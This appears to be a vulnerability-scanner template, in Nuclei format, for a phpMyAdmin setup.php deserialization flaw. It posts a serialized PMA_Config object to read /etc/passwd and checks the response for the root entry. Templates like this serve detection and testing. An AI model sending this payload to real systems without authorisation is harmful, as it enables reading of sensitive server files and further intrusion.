id: phpmyadmin-setup-deserialization

info:
  name: Phpmyadmin Setup Deserialization
  author: pikpikcu
  severity: high
  reference: https://github.com/vulhub/vulhub/tree/master/phpmyadmin/WooYun-2016-199433
  tags: phpmyadmmin,lfi

requests:
  - method: POST
    path:
      - '{{BaseURL}}/scripts/setup.php'
    body: |
      action=test&configuration=O:10:"PMA_Config":1:{s:6:"source",s:11:"/etc/passwd";}

    matchers-condition: and
    matchers:
      - type: regex
        regex:
          - "root:[x*]:0:0:"
        part: body
        condition: and
      - type: status
        status:
          - 200
